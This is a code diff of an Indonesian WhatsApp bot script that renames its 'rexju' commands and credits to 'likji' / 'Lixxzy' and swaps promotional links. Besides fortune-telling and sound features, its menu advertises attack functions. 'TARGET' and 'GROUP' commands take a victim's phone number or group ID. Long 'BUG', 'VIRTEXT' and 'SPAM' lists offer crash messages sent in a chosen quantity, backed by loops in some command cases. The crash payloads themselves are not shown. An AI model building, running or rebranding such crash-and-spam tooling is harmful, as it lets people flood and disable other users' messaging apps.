+case 'likjiba': case 'likji5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1938,7 +1938,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjube': case 'rexju6': {
+case 'likjibe': case 'likji6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1951,7 +1951,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjubu': case 'rexju7': {
+case 'likjibu': case 'likji7': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1964,7 +1964,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjubi': case 'rexju8': {
+case 'likjibi': case 'likji8': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1977,7 +1977,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuca': case 'rexju9': {
+case 'likjica': case 'likji9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1990,7 +1990,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuci': case 'rexju10': {
+case 'likjici': case 'likji10': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -2003,7 +2003,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjucu': case 'rexju11': {
+case 'likjicu': case 'likji11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -2016,7 +2016,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'rexjuco': case 'sleme12': {
+case 'likjico': case 'sleme12': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -2115,7 +2115,7 @@ if (isBan) throw sticBanLu(from)
  haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
  }
  break
-case 'rexju': {
+case 'likji': {
 if (isBan) throw sticBanLu(from)
  me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
@@ -2675,7 +2675,7 @@ const result4 = `*DOWNLOAD MEDIAFIRE*
 *Link* : ${baby1[0].link}\n
 _whoa wait zimbot processing..._
 
-*© °rexju°͢*`
+*© 𝐿𝑖𝑥𝑥𝑧𝑦͢*`
 reply(`${result4}`)
 haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted: m }).catch ((err) => m.reply('*Failed to download File*'))
 }
@@ -3432,7 +3432,7 @@ break
 //=================================================//
 case 'ramalanjodoh': case 'ramaljodoh': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3442,7 +3442,7 @@ break
 //=================================================//
 case 'ramalanjodohbali': case 'ramaljodohbali': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3452,7 +3452,7 @@ break
 //=================================================//
 case 'suamiistri': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3462,7 +3462,7 @@ break
 //=================================================//
 case 'ramalancinta': case 'ramalcinta': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005, Putri, 16, 11, 2004`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3472,7 +3472,7 @@ break
 //=================================================//
 case 'artinama': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°Gans`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦Gans`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
@@ -3481,7 +3481,7 @@ break
 //=================================================//
 case 'kecocokannama': case 'cocoknama': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
@@ -3491,7 +3491,7 @@ break
 //=================================================//
 case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢|Putri`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
@@ -3571,7 +3571,7 @@ break
 //=================================================//
 case 'fengshui': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
@@ -3651,7 +3651,7 @@ break
 //=================================================//
 case 'sifat': case 'karakter': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
@@ -3661,7 +3661,7 @@ break
 //=================================================//
 case 'keberuntungan': {
 if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} © °rexju°͢, 7, 7, 2005`
+if (!text) throw `Example : ${prefix + command} © 𝐿𝑖𝑥𝑥𝑧𝑦͢, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
@@ -3689,167 +3689,167 @@ haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${
 }
 break
 /*
-case 'rexjusound1':
-case 'rexjusound2':
-case 'rexjusound3':
-case 'rexjusound4':
-case 'rexjusound5':
-case 'rexjusound6':
-case 'rexjusound7':
-case 'rexjusound8':
-case 'rexjusound9':
-case 'rexjusound10':
-case 'rexjusound11':
-case 'rexjusound12':
-case 'rexjusound13':
-case 'rexjusound14':
-case 'rexjusound15':
-case 'rexjusound16':
-case 'rexjusound17':
-case 'rexjusound18':
-case 'rexjusound19':
-case 'rexjusound20':
-case 'rexjusound21':
-case 'rexjusound22':
-case 'rexjusound23':
-case 'rexjusound24':
-case 'rexjusound25':
-case 'rexjusound26':
-case 'rexjusound27':
-case 'rexjusound28':
-case 'rexjusound29':
-case 'rexjusound30':
-case 'rexjusound31':
-case 'rexjusound32':
-case 'rexjusound33':
-case 'rexjusound34':
-case 'rexjusound35':
-case 'rexjusound36':
-case 'rexjusound37':
-case 'rexjusound38':
-case 'rexjusound39':
-case 'rexjusound40':
-case 'rexjusound41':
-case 'rexjusound42':
-case 'rexjusound43':
-case 'rexjusound44':
-case 'rexjusound45':
-case 'rexjusound46':
-case 'rexjusound47':
-case 'rexjusound48':
-case 'rexjusound49':
-case 'rexjusound50':
-case 'rexjusound51':
-case 'rexjusound52':
-case 'rexjusound53':
-case 'rexjusound54':
-case 'rexjusound55':
-case 'rexjusound56':
-case 'rexjusound57':
-case 'rexjusound58':
-case 'rexjusound59':
-case 'rexjusound60':
-case 'rexjusound61':
-case 'rexjusound62':
-case 'rexjusound63':
-case 'rexjusound64':
-case 'rexjusound65':
-case 'rexjusound66':
-case 'rexjusound67':
-case 'rexjusound68':
-case 'rexjusound69':
-case 'rexjusound70':
-case 'rexjusound71':
-case 'rexjusound72':
-case 'rexjusound73':
-case 'rexjusound74':
-case 'rexjusound75':
-case 'rexjusound76':
-case 'rexjusound77':
-case 'rexjusound78':
-case 'rexjusound79':
-case 'rexjusound80':
-case 'rexjusound81':
-case 'rexjusound82':
-case 'rexjusound83':
-case 'rexjusound84':
-case 'rexjusound85':
-case 'rexjusound86':
-case 'rexjusound87':
-case 'rexjusound88':
-case 'rexjusound89':
-case 'rexjusound90':
-case 'rexjusound91':
-case 'rexjusound92':
-case 'rexjusound93':
-case 'rexjusound94':
-case 'rexjusound95':
-case 'rexjusound96':
-case 'rexjusound97':
-case 'rexjusound98':
-case 'rexjusound99':
-case 'rexjusound100':
-case 'rexjusound101':
-case 'rexjusound102':
-case 'rexjusound103':
-case 'rexjusound104':
-case 'rexjusound105':
-case 'rexjusound106':
-case 'rexjusound107':
-case 'rexjusound108':
-case 'rexjusound109':
-case 'rexjusound110':
-case 'rexjusound111':
-case 'rexjusound112':
-case 'rexjusound113':
-case 'rexjusound114':
-case 'rexjusound115':
-case 'rexjusound116':
-case 'rexjusound117':
-case 'rexjusound118':
-case 'rexjusound119':
-case 'rexjusound120':
-case 'rexjusound121':
-case 'rexjusound122':
-case 'rexjusound123':
-case 'rexjusound124':
-case 'rexjusound125':
-case 'rexjusound126':
-case 'rexjusound127':
-case 'rexjusound128':
-case 'rexjusound129':
-case 'rexjusound130':
-case 'rexjusound131':
-case 'rexjusound132':
-case 'rexjusound133':
-case 'rexjusound134':
-case 'rexjusound135':
-case 'rexjusound136':
-case 'rexjusound137':
-case 'rexjusound138':
-case 'rexjusound139':
-case 'rexjusound140':
-case 'rexjusound141':
-case 'rexjusound142':
-case 'rexjusound143':
-case 'rexjusound144':
-case 'rexjusound145':
-case 'rexjusound146':
-case 'rexjusound147':
-case 'rexjusound148':
-case 'rexjusound149':
-case 'rexjusound150':
-case 'rexjusound151':
-case 'rexjusound152':
-case 'rexjusound153':
-case 'rexjusound154':
-case 'rexjusound155':
-case 'rexjusound156':
-case 'rexjusound157':
-case 'rexjusound158':
-case 'rexjusound159':
-case 'rexjusound160':
-case 'rexjusound161':
+case 'likjisound1':
+case 'likjisound2':
+case 'likjisound3':
+case 'likjisound4':
+case 'likjisound5':
+case 'likjisound6':
+case 'likjisound7':
+case 'likjisound8':
+case 'likjisound9':
+case 'likjisound10':
+case 'likjisound11':
+case 'likjisound12':
+case 'likjisound13':
+case 'likjisound14':
+case 'likjisound15':
+case 'likjisound16':
+case 'likjisound17':
+case 'likjisound18':
+case 'likjisound19':
+case 'likjisound20':
+case 'likjisound21':
+case 'likjisound22':
+case 'likjisound23':
+case 'likjisound24':
+case 'likjisound25':
+case 'likjisound26':
+case 'likjisound27':
+case 'likjisound28':
+case 'likjisound29':
+case 'likjisound30':
+case 'likjisound31':
+case 'likjisound32':
+case 'likjisound33':
+case 'likjisound34':
+case 'likjisound35':
+case 'likjisound36':
+case 'likjisound37':
+case 'likjisound38':
+case 'likjisound39':
+case 'likjisound40':
+case 'likjisound41':
+case 'likjisound42':
+case 'likjisound43':
+case 'likjisound44':
+case 'likjisound45':
+case 'likjisound46':
+case 'likjisound47':
+case 'likjisound48':
+case 'likjisound49':
+case 'likjisound50':
+case 'likjisound51':
+case 'likjisound52':
+case 'likjisound53':
+case 'likjisound54':
+case 'likjisound55':
+case 'likjisound56':
+case 'likjisound57':
+case 'likjisound58':
+case 'likjisound59':
+case 'likjisound60':
+case 'likjisound61':
+case 'likjisound62':
+case 'likjisound63':
+case 'likjisound64':
+case 'likjisound65':
+case 'likjisound66':
+case 'likjisound67':
+case 'likjisound68':
+case 'likjisound69':
+case 'likjisound70':
+case 'likjisound71':
+case 'likjisound72':
+case 'likjisound73':
+case 'likjisound74':
+case 'likjisound75':
+case 'likjisound76':
+case 'likjisound77':
+case 'likjisound78':
+case 'likjisound79':
+case 'likjisound80':
+case 'likjisound81':
+case 'likjisound82':
+case 'likjisound83':
+case 'likjisound84':
+case 'likjisound85':
+case 'likjisound86':
+case 'likjisound87':
+case 'likjisound88':
+case 'likjisound89':
+case 'likjisound90':
+case 'likjisound91':
+case 'likjisound92':
+case 'likjisound93':
+case 'likjisound94':
+case 'likjisound95':
+case 'likjisound96':
+case 'likjisound97':
+case 'likjisound98':
+case 'likjisound99':
+case 'likjisound100':
+case 'likjisound101':
+case 'likjisound102':
+case 'likjisound103':
+case 'likjisound104':
+case 'likjisound105':
+case 'likjisound106':
+case 'likjisound107':
+case 'likjisound108':
+case 'likjisound109':
+case 'likjisound110':
+case 'likjisound111':
+case 'likjisound112':
+case 'likjisound113':
+case 'likjisound114':
+case 'likjisound115':
+case 'likjisound116':
+case 'likjisound117':
+case 'likjisound118':
+case 'likjisound119':
+case 'likjisound120':
+case 'likjisound121':
+case 'likjisound122':
+case 'likjisound123':
+case 'likjisound124':
+case 'likjisound125':
+case 'likjisound126':
+case 'likjisound127':
+case 'likjisound128':
+case 'likjisound129':
+case 'likjisound130':
+case 'likjisound131':
+case 'likjisound132':
+case 'likjisound133':
+case 'likjisound134':
+case 'likjisound135':
+case 'likjisound136':
+case 'likjisound137':
+case 'likjisound138':
+case 'likjisound139':
+case 'likjisound140':
+case 'likjisound141':
+case 'likjisound142':
+case 'likjisound143':
+case 'likjisound144':
+case 'likjisound145':
+case 'likjisound146':
+case 'likjisound147':
+case 'likjisound148':
+case 'likjisound149':
+case 'likjisound150':
+case 'likjisound151':
+case 'likjisound152':
+case 'likjisound153':
+case 'likjisound154':
+case 'likjisound155':
+case 'likjisound156':
+case 'likjisound157':
+case 'likjisound158':
+case 'likjisound159':
+case 'likjisound160':
+case 'likjisound161':
  if (isBan) throw sticBanLu(from)
 xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
@@ -3868,7 +3868,7 @@ await sleep(1500)
 let btn = [{
 urlButton: {
 displayText: 'Youtube',
-url: 'https://youtube.com/c/HwModsWa857'
+url: 'https://youtube.com/@user-pb3qt2ek1x'
 }
 }, {
 callButton: {
@@ -3909,7 +3909,7 @@ await sleep(1500)
 let btn = [{
 urlButton: {
 displayText: 'Youtube',
-url: 'https://youtube.com/c/HwModsWa857'
+url: 'https://youtube.com/@user-pb3qt2ek1x'
 }
 }, {
 callButton: {
@@ -4418,7 +4418,7 @@ m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
 break
-case 'rexjughoib': case 'welcome': {
+case 'likjighoib': case 'welcome': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 
@@ -4646,11 +4646,11 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushnam
 ┣❏ Ownermenu  ➥ 
 ┗━━⊱
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-© °rexju°͢`, contextInfo:{"externalAdReply": {"title": `SC °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+© 𝐿𝑖𝑥𝑥𝑧𝑦͢`, contextInfo:{"externalAdReply": {"title": `SC 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4671,26 +4671,26 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushnam
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ SPECIAL ]
 ┣❏afk { kasih reactions }
-┣❏rexjughoib [ on / off ]
-┣❏rexjujagoan [ reply target ]
-┣❏rexjusange [ Harus Menjadi Admin ]
+┣❏likjighoib [ on / off ]
+┣❏likjijagoan [ reply target ]
+┣❏likjisange [ Harus Menjadi Admin ]
 ┣❏bugtiktok [ Link ] - Bug Sw
-┗━━⊱[°rexju°]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ TARGET ]
 ┣❏🔥 628xxx|5|5
 ┣❏crashmex 628xxx|5|5
-┣❏rexjuskuy 628xxx
-┣❏rexjusantet 628xxx@s.whatsapp.net|10|10s
+┣❏likjiskuy 628xxx
+┣❏likjisantet 628xxx@s.whatsapp.net|10|10s
 ┣❏catalogpc 628xxx@s.whatsapp.net|10|10s
-┗━━⊱[°rexju°]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Ketik > m.chat ( di group dulu )
 ┏━━⊱[ GROUP ]
-┣❏gasrexju 112674448xxx
-┣❏rexjusantetgc  1237891xxxx@g.us|10|10s
+┣❏gaslikji 112674448xxx
+┣❏likjisantetgc  1237891xxxx@g.us|10|10s
 ┣❏cataloggc 1237891xxxx@g.us|10|10s
-┗━━⊱[°rexju°]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ┏━━⊱[ BUG ]
 ┣❏💀 [ jumlah ]
 ┣❏👽 [ jumlah ]
@@ -4756,74 +4756,74 @@ Ketik > m.chat ( di group dulu )
 ┣❏🐍 [ jumlah ]
 ┣❏🦂 [ jumlah ]
 ┣❏🌷 [ jumlah ]
-┣❏rexju1 [ jumlah ]
-┣❏rexju2 [ jumlah ]
-┣❏rexju3 [ jumlah ]
-┣❏rexju4 [ jumlah ]
-┣❏rexju5 [ jumlah ]
-┣❏rexju6 [ jumlah ]
-┣❏rexju7 [ jumlah ]
-┣❏rexju8 [ jumlah ]
-┣❏rexju9 [ jumlah ]
-┣❏rexju10 [ jumlah ]
-┣❏rexju11 [ jumlah ]
-┣❏rexju12 [ jumlah ]
-┣❏rexju13 [ jumlah ]
-┣❏rexju14 [ jumlah ]
-┣❏rexju15 [ jumlah ]
-┣❏rexju16 [ jumlah ]
-┣❏rexju17 [ jumlah ]
-┣❏rexju18 [ jumlah ]
-┣❏rexju19 [ jumlah ]
-┣❏rexju20 [ jumlah ]
-┣❏rexju21 [ jumlah ]
-┣❏rexju22 [ jumlah ]
-┣❏rexju23 [ jumlah ]
-┣❏rexju24 [ jumlah ]
-┣❏rexju25 [ jumlah ]
-┣❏rexju26 [ jumlah ]
-┣❏rexju27 [ jumlah ]
-┣❏rexju28 [ jumlah ]
-┣❏rexju29 [ jumlah ]
-┣❏rexju30 [ jumlah ]
-┣❏rexju31 [ jumlah ]
-┣❏rexju32 [ jumlah ]
-┣❏rexju33 [ jumlah ]
-┣❏rexju34 [ jumlah ]
-┣❏rexju35 [ jumlah ]
-┣❏rexju36 [ jumlah ]
-┣❏rexju37 [ jumlah ]
-┣❏rexju38 [ jumlah ]
-┣❏rexju39 [ jumlah ]
-┣❏rexju40 [ jumlah ]
-┣❏rexju41 [ jumlah ]
-┣❏rexju42 [ jumlah ]
-┣❏rexju43 [ jumlah ]
-┣❏rexju44 [ jumlah ]
-┣❏rexju45 [ jumlah ]
-┣❏rexju46 [ jumlah ]
-┣❏rexju47 [ jumlah ]
-┣❏rexju48 [ jumlah ]
-┣❏rexju49 [ jumlah ]
-┣❏rexju50 [ jumlah ]
-┣❏rexju51 [ jumlah ]
-┣❏rexju52 [ jumlah ]
-┣❏rexju53 [ jumlah ]
-┣❏rexju54 [ jumlah ]
-┣❏rexju55 [ jumlah ]
-┣❏rexju56 [ jumlah ]
-┣❏rexju57 [ jumlah ]
-┣❏rexju58 [ jumlah ]
-┣❏rexju59 [ jumlah ]
-┣❏rexju60 [ jumlah ]
+┣❏likji1 [ jumlah ]
+┣❏likji2 [ jumlah ]
+┣❏likji3 [ jumlah ]
+┣❏likji4 [ jumlah ]
+┣❏likji5 [ jumlah ]
+┣❏likji6 [ jumlah ]
+┣❏likji7 [ jumlah ]
+┣❏likji8 [ jumlah ]
+┣❏likji9 [ jumlah ]
+┣❏likji10 [ jumlah ]
+┣❏likji11 [ jumlah ]
+┣❏likji12 [ jumlah ]
+┣❏likji13 [ jumlah ]
+┣❏likji14 [ jumlah ]
+┣❏likji15 [ jumlah ]
+┣❏likji16 [ jumlah ]
+┣❏likji17 [ jumlah ]
+┣❏likji18 [ jumlah ]
+┣❏likji19 [ jumlah ]
+┣❏likji20 [ jumlah ]
+┣❏likji21 [ jumlah ]
+┣❏likji22 [ jumlah ]
+┣❏likji23 [ jumlah ]
+┣❏likji24 [ jumlah ]
+┣❏likji25 [ jumlah ]
+┣❏likji26 [ jumlah ]
+┣❏likji27 [ jumlah ]
+┣❏likji28 [ jumlah ]
+┣❏likji29 [ jumlah ]
+┣❏likji30 [ jumlah ]
+┣❏likji31 [ jumlah ]
+┣❏likji32 [ jumlah ]
+┣❏likji33 [ jumlah ]
+┣❏likji34 [ jumlah ]
+┣❏likji35 [ jumlah ]
+┣❏likji36 [ jumlah ]
+┣❏likji37 [ jumlah ]
+┣❏likji38 [ jumlah ]
+┣❏likji39 [ jumlah ]
+┣❏likji40 [ jumlah ]
+┣❏likji41 [ jumlah ]
+┣❏likji42 [ jumlah ]
+┣❏likji43 [ jumlah ]
+┣❏likji44 [ jumlah ]
+┣❏likji45 [ jumlah ]
+┣❏likji46 [ jumlah ]
+┣❏likji47 [ jumlah ]
+┣❏likji48 [ jumlah ]
+┣❏likji49 [ jumlah ]
+┣❏likji50 [ jumlah ]
+┣❏likji51 [ jumlah ]
+┣❏likji52 [ jumlah ]
+┣❏likji53 [ jumlah ]
+┣❏likji54 [ jumlah ]
+┣❏likji55 [ jumlah ]
+┣❏likji56 [ jumlah ]
+┣❏likji57 [ jumlah ]
+┣❏likji58 [ jumlah ]
+┣❏likji59 [ jumlah ]
+┣❏likji60 [ jumlah ]
 ┣❏buttonkematian [ jumlah ]
 ┣❏mexcrot [ jumlah ]
-┣❏rexjunih [ jumlah ]
+┣❏likjinih [ jumlah ]
 ┣❏okemex [ jumlah ]
 ┣❏ahyangbetul [ jumlah ]
 ┣❏ampunsuhu [ jumlah ]
 ┣❏mexdemam [ jumlah ]
-┗━━⊱[°rexju°]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ JADI BUG VIP ]
 ┣❏jadikatalog [reply sticker] jumlah
@@ -4853,20 +4853,20 @@ Ketik > m.chat ( di group dulu )
 ┣❏jadibug3 [Reply Audio Jadi Bug Vn]
 ┣❏jadibug4 [Reply Sticker Jadi Bug Gambar]
 ┣❏jadibug5 [Reply Gambar Jadi Bug Once] 
-┗━━⊱[°rexju°]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ VIRTEXT ]
-┣❏rexju𝐯irtext1 [ jumlah ]
-┣❏rexju𝐯irtext2 [ jumlah ]
-┣❏rexju𝐯irtext3 [ jumlah ]
-┣❏rexju𝐯irtext4 [ jumlah ]
-┣❏rexju𝐯irtext5 [ jumlah ]
-┣❏rexju𝐯irtext6 [ jumlah ]
-┣❏rexju𝐯irtext7 [ jumlah ]
-┣❏rexju𝐯irtext8 [ jumlah ]
-┣❏rexju𝐯irtext9 [ jumlah ]
-┣❏rexju𝐯irtext10 [ jumlah ]
-┗━━⊱[°rexju°]
+┣❏likji𝐯irtext1 [ jumlah ]
+┣❏likji𝐯irtext2 [ jumlah ]
+┣❏likji𝐯irtext3 [ jumlah ]
+┣❏likji𝐯irtext4 [ jumlah ]
+┣❏likji𝐯irtext5 [ jumlah ]
+┣❏likji𝐯irtext6 [ jumlah ]
+┣❏likji𝐯irtext7 [ jumlah ]
+┣❏likji𝐯irtext8 [ jumlah ]
+┣❏likji𝐯irtext9 [ jumlah ]
+┣❏likji𝐯irtext10 [ jumlah ]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ┏━━⊱[ SPAM ]
@@ -4886,93 +4886,93 @@ Ketik > m.chat ( di group dulu )
 ┣❏yeet [ jumlah ]
 ┣❏bite [ jumlah ]
 ┣❏lick [ jumlah ]
-┣❏rexjukangbuttton [ jumlah ]
-┣❏rexjudelay [ jumlah ]
-┣❏rexjustik [ jumlah ]
-┣❏rexjubugie [ jumlah ]
+┣❏likjikangbuttton [ jumlah ]
+┣❏likjidelay [ jumlah ]
+┣❏likjistik [ jumlah ]
+┣❏likjibugie [ jumlah ]
 ┣❏buglokas [ jumlah ]
-┣❏rexjutod [ jumlah ]
-┣❏rexjubokep [ jumlah ]
+┣❏likjitod [ jumlah ]
+┣❏likjibokep [ jumlah ]
 ┣❏bugin𝐯ite [ jumlah ] Pc
-┣❏rexjuha [ jumlah ]
-┣❏rexjuhi [ jumlah ]
-┣❏rexjurexjuhu [ jumlah ]
-┣❏rexjuhe [ jumlah ]
-┣❏rexjuba [ jumlah ]
-┣❏rexjube [ jumlah ]
-┣❏rexjubu [ jumlah ]
-┣❏rexjubi [ jumlah ]
-┣❏rexjuca [ jumlah ]
-┣❏rexjuci [ jumlah ]
-┣❏rexjucu [ jumlah ]
-┣❏rexjuco [ jumlah ]
-┣❏rexjubug1 [ jumlah ]
-┣❏rexjubug2 [ jumlah ]
-┣❏rexjubug3 [ jumlah ]
-┣❏rexjubug4 [ jumlah ]
-┣❏rexjubug5 [ jumlah ]
-┣❏rexjubug6 [ jumlah ]
-┣❏rexjubug7 [ jumlah ]
-┣❏rexjupoll [ jumlah ]
-┣❏rexjutag [ jumlah ]
+┣❏likjiha [ jumlah ]
+┣❏likjihi [ jumlah ]
+┣❏likjilikjihu [ jumlah ]
+┣❏likjihe [ jumlah ]
+┣❏likjiba [ jumlah ]
+┣❏likjibe [ jumlah ]
+┣❏likjibu [ jumlah ]
+┣❏likjibi [ jumlah ]
+┣❏likjica [ jumlah ]
+┣❏likjici [ jumlah ]
+┣❏likjicu [ jumlah ]
+┣❏likjico [ jumlah ]
+┣❏likjibug1 [ jumlah ]
+┣❏likjibug2 [ jumlah ]
+┣❏likjibug3 [ jumlah ]
+┣❏likjibug4 [ jumlah ]
+┣❏likjibug5 [ jumlah ]
+┣❏likjibug6 [ jumlah ]
+┣❏likjibug7 [ jumlah ]
+┣❏likjipoll [ jumlah ]
+┣❏likjitag [ jumlah ]
 ┣❏inibug [ jumlah ]
 ┣❏hiya [ jumlah ]
 ┣❏lokas [ jumlah ]
